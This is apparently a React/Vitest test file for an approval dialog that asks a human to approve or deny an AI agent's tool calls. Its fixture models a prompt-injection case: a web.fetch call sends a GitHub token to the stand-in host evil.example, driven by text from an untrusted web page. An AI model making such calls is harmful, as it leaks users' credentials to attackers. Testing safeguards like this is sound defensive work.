import { act, cleanup, fireEvent, render, screen } from '@testing-library/react';
import type { ToolApprovalRequest, ToolApprovalResolved } from '@midnite/studio-shared';
import { afterEach, describe, expect, it, vi } from 'vitest';

import { ToolApprovalCard, ToolApprovalHost } from './tool-approval-card';

afterEach(() => {
  cleanup();
  delete (window as unknown as { midniteStudio?: unknown }).midniteStudio;
});

const request = (over: Partial<ToolApprovalRequest> = {}): ToolApprovalRequest => ({
  id: 'c1',
  tool: 'web.fetch',
  args: '{\n  "url": "https://evil.example/x",\n  "token": "[redacted: github-token]"\n}',
  ruleId: 'untrusted-path-or-url',
  reason: 'Text from an untrusted source reached a path or URL this call uses.',
  provenance: [{ origin: 'web-page', ref: 'https://evil.example/page', trust: 'untrusted' }],
  askedAt: 0,
  expiresAt: 600_000,
  ...over,
});

describe('ToolApprovalCard', () => {
  it('shows the tool, redacted arguments, provenance and the rule, and answers three ways', () => {
    const onAnswer = vi.fn();
    render(<ToolApprovalCard request={request()} onAnswer={onAnswer} />);
    expect(screen.getByRole('alertdialog').textContent).toContain('web.fetch');
    expect(screen.getByTestId('tool-approval-args').textContent).toContain('[redacted: github-token]');
    expect(screen.getByTestId('tool-approval-provenance').textContent).toContain('a web page');
    expect(screen.getByTestId('tool-approval-provenance').textContent).toContain('https://evil.example/page');
    expect(screen.getByTestId('tool-approval-card').textContent).toContain('untrusted-path-or-url');
    fireEvent.click(screen.getByText('Approve once'));
    fireEvent.click(screen.getByText('Approve for this session'));
    fireEvent.click(screen.getByText('Deny'));
    expect(onAnswer.mock.calls.map((c) => c[0])).toEqual(['approve-once', 'approve-session', 'deny']);
  });

  it('omits the provenance block when nothing untrusted reached the call, and offers no batch action', () => {
    render(<ToolApprovalCard request={request({ provenance: [], ruleId: 'git-reset', tool: 'git.reset' })} onAnswer={vi.fn()} />);
    expect(screen.queryByTestId('tool-approval-provenance')).toBeNull();
    expect(screen.queryByRole('button', { name: /approve all|batch/i })).toBeNull();
    expect(screen.getAllByRole('button')).toHaveLength(3);
  });
});

describe('ToolApprovalHost', () => {
  function bridgeWith() {
    const handlers: { requested?: (r: ToolApprovalRequest) => void; resolved?: (r: ToolApprovalResolved) => void } = {};
    const answer = vi.fn(async () => ({ ok: true, value: {} }));
    (window as unknown as { midniteStudio: unknown }).midniteStudio = {
      toolApproval: {
        onRequested: (h: (r: ToolApprovalRequest) => void) => ((handlers.requested = h), () => undefined),
        onResolved: (h: (r: ToolApprovalResolved) => void) => ((handlers.resolved = h), () => undefined),
        answer,
      },
    };
    return { handlers, answer };
  }

  it('renders nothing until a request arrives, then one card at a time, queued', () => {
    const { handlers, answer } = bridgeWith();
    render(<ToolApprovalHost />);
    expect(screen.queryByTestId('tool-approval-card')).toBeNull();

    act(() => {
      handlers.requested!(request({ id: 'a', tool: 'git.reset' }));
      handlers.requested!(request({ id: 'b', tool: 'workflow_gate_decide' }));
    });
    expect(screen.getAllByTestId('tool-approval-card')).toHaveLength(1);
    expect(screen.getByRole('alertdialog').textContent).toContain('git.reset');
    expect(screen.getByTestId('tool-approval-queue').textContent).toBe('1 of 2');

    fireEvent.click(screen.getByText('Deny'));
    expect(answer).toHaveBeenCalledWith({ id: 'a', decision: 'deny' });
    expect(screen.getByRole('alertdialog').textContent).toContain('workflow_gate_decide');
    expect(screen.queryByTestId('tool-approval-queue')).toBeNull();
  });

  it('drops a card main says was answered elsewhere or timed out', () => {
    const { handlers } = bridgeWith();
    render(<ToolApprovalHost />);
    act(() => handlers.requested!(request({ id: 'a' })));
    expect(screen.getByTestId('tool-approval-card')).toBeTruthy();
    act(() => handlers.resolved!({ id: 'a', decision: 'timeout' }));
    expect(screen.queryByTestId('tool-approval-card')).toBeNull();
  });

  it('is inert with no bridge', () => {
    render(<ToolApprovalHost />);
    expect(screen.queryByTestId('tool-approval-host')).toBeNull();
  });
});
